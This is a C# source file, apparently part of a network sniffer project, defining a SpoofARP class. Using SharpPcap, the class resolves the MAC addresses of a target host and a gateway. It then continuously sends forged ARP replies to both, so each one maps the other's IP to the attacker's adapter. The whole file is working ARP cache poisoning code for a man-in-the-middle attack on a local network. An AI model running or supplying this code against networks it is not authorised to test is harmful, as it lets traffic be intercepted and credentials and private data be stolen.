using PacketDotNet;
using SharpPcap;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace NetworkSniffer
{
    public class SpoofARP
    {

        #region --- Class Data -------------------------------

        private object syncRoot = new Object();
        private bool _isRunning = false;

        #endregion

        #region --- Constructor ------------------------------

        public SpoofARP( ILiveDevice liveDevice, IPAddress srcIpAddresse,IPAddress desIpAddresse)
        {

            Adapter = liveDevice;
            SrcIpAddresse = srcIpAddresse;
            SrcMACAddresse = getMACAddress(srcIpAddresse);
            DesIpAddresse = desIpAddresse;
            DesMACAddresse = getMACAddress(desIpAddresse);


        }
        #endregion
        #region --- Public Methods ---------------------------

        public void SendArpRequstsAsync()
        {

            lock (this.syncRoot)
            {
                if (TargetPacket != null || GatwayPacket != null)
                {
                    if (!this._isRunning)
                    {
                        ThreadPool.QueueUserWorkItem(new WaitCallback(ThreadProc));
                    }
                }else
                {
                    Error = true; 
                }
            }
            

        }

        public void StopAsync()
        {
            ThreadStart ts = new ThreadStart(Stop);
            Thread thd = new Thread(ts);
            thd.Start();
        }
        #endregion

        #region --- Private Methods --------------------------

        private void Stop()
        {
            lock (this.syncRoot)
            {
                if (this._isRunning)
                {
                    // Tell the worker thread that it needs to abort.
                    this._isRunning = false;

                }
            }
        }

        private void ThreadProc(Object stateInfo)
        {

            this._isRunning = true;

           
                while (Thread.CurrentThread.ThreadState != ThreadState.AbortRequested)
                {

                    Adapter.SendPacket(TargetPacket);
                    Adapter.SendPacket(GatwayPacket);
                    Thread.Sleep(100);

                    if (!this._isRunning)
                        Thread.CurrentThread.Abort();
                   

                    
                }

        }


        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        public static extern int SendARP(int DestIP, int SrcIP, [Out] byte[] MacAddr, ref int MacLen);

        public PhysicalAddress getMACAddress(IPAddress IPAddress)
        {
          

            try
            { 
                byte[] MACByte= new byte[6];
                int MACLength = MACByte.Length;
                SendARP((int)IPAddress.Address, 0, MACByte, ref MACLength);
                string MACSSTR = BitConverter.ToString(MACByte, 0, 6);
                if (MACSSTR != "00-00-00-00-00-00")
                    return  PhysicalAddress.Parse(MACSSTR);
            }
            catch (Exception ex) { return null; }
            return null;

        }
        #endregion

        #region --- IDisposable-------------------------------

        private bool disposed = false;
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!this.disposed)
            {
                if (disposing)
                {
                    // Clean up all managed resources
                    Stop();
                }
            }

            // Clean up all native resources

            disposed = true;
        }

        #endregion

        #region --- Properties -------------------------------
        public ILiveDevice Adapter { get; set; }
        public IPAddress SrcIpAddresse { get; set; }
        public PhysicalAddress SrcMACAddresse { get; set; } 
        public IPAddress DesIpAddresse { get; set; }
        public PhysicalAddress DesMACAddresse { get; set; }

        public bool Error = false;
        public Packet TargetPacket
        {
            get
            {
                try
                {

                    if(SrcIpAddresse ==null || SrcMACAddresse == null||DesIpAddresse==null||DesMACAddresse ==null)
                    {
                        throw new Exception("one or more of the required value is null");
                    }
                    else
                    {

                        EthernetPacket EthernetPacket = new EthernetPacket(Adapter.MacAddress, DesMACAddresse, EthernetType.Arp);

                        ArpPacket ArpPacket = new ArpPacket(ArpOperation.Response, DesMACAddresse, DesIpAddresse, Adapter.MacAddress, SrcIpAddresse);

                        EthernetPacket.PayloadPacket = ArpPacket;

                        return EthernetPacket;
                    }
                  
                }
                catch (Exception ex)
                {

                    Error = true;

                    return null;
                }
            }
        }

        public Packet GatwayPacket
        {
            get
            {
                try
                {
                    if (SrcIpAddresse == null || SrcMACAddresse == null || DesIpAddresse == null || DesMACAddresse == null)
                    {
                        throw new Exception("one or more of the required value is null");
                    }
                    else
                    {
                        EthernetPacket EthernetPacket = new EthernetPacket(Adapter.MacAddress, SrcMACAddresse, EthernetType.Arp);

                        ArpPacket ArpPacket = new ArpPacket(ArpOperation.Response, SrcMACAddresse, SrcIpAddresse, Adapter.MacAddress, DesIpAddresse);

                        EthernetPacket.PayloadPacket = ArpPacket;

                        return EthernetPacket;
                    }
                }
                catch (Exception ex)
                {

                    Error = true;

                    return null;
                }
            }
        }
        public bool IsRunning
        {
            get { return this._isRunning; }
        }



        #endregion

    }
}
